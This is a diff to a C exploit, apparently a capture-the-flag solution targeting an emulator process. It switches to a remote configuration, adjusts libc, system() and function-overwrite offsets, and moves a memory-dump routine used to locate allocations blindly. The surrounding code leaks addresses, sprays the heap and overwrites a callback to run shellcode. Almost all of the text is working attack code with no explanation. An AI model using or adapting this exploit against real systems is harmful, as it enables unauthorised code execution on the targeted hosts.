@@ -3,27 +3,26 @@
 extern void bka(uint8_t a);
 extern void bkx(uint8_t a);
 
-//#define REMOTE
+#define REMOTE
 
 #define HEAP_LIBC_PAGE 0x4
 #define HEAP_LIBC_OFF 0x1E50
 
 #ifdef REMOTE
-#define LD_PAGE 0x1
-#define DREAM_OFF 0x3f3000
+#define M_RAM_OFF 0x551f0
+#define FUNC_OVERWRITE_OFF 0x3EB9D8
 #endif
 #ifndef REMOTE
-#define DREAM_OFF 0xA2D60
-//0xA8000
-#define LD_PAGE 0x1
+#define M_RAM_OFF 0x553e0
+#define FUNC_OVERWRITE_OFF 0x3FB108
 #endif
+#define DREAM_OFF 0xA2D60
+#define LD_PAGE 0x1
 #define LD_OFF 0x3f0
 #define HEAP_OFF 0x3d0
 #define RWX_OFF 0x3000
 #define LIBC_OFF 0x217000
 #define SYSTEM_OFF 0x28670
-#define FUNC_OVERWRITE_OFF 0x3FB108
-#define M_RAM_OFF 0x553e0
 #define JOYCON_CB_RWX_DIFF 0x62D79
 #define SHELLCODE_SZ 0x4a
 #define SPRAY_CNT 3
@@ -172,6 +171,10 @@ void debug(){
     while(1) *(uint8_t*)JOY1 = 1;
 }
 
+void redemption(){
+    *(uint8_t*)0x9001 = 0x10;
+}
+
 int main(void) {
     uint32_t rwx_low, rwx_high;
     uint32_t mram_low, mram_high;
@@ -181,17 +184,9 @@ int main(void) {
 
     //debug();
 
-    xorAt64(DREAM_OFF+0x1c, 0, LD_PAGE & 0xff);
+    //xorAt64(DREAM_OFF+0x1c, 0, LD_PAGE & 0xff);
+    redemption();
 
-    //for finding Mapper allocation on blind remote
-#ifdef DUMP
-    putchar(0x44);
-    putchar(0x44);
-    for(i = 0; i < 8; i++)
-        dump(DREAM_OFF + i*0x100);
-    putchar(0x45);
-    putchar(0x45);
-#endif
 
     rwx_low = rwx_high = 0;
     leak(LD_OFF, &rwx_high, &rwx_low);
@@ -228,6 +223,16 @@ int main(void) {
         mram_rwx_off_low += 0x50;
     }
     mram_rwx_off_low -= SPRAY_CNT*0x100;
+
+    //for finding Mapper allocation on blind remote
+#ifdef DUMP
+    putchar(0x44);
+    putchar(0x44);
+    for(i = 0; i < 8; i++)
+        dump(FUNC_OVERWRITE_OFF + i*0x100);
+    putchar(0x45);
+    putchar(0x45);
+#endif
 
     //overwrite callback function
     overwrite = rwx_low;
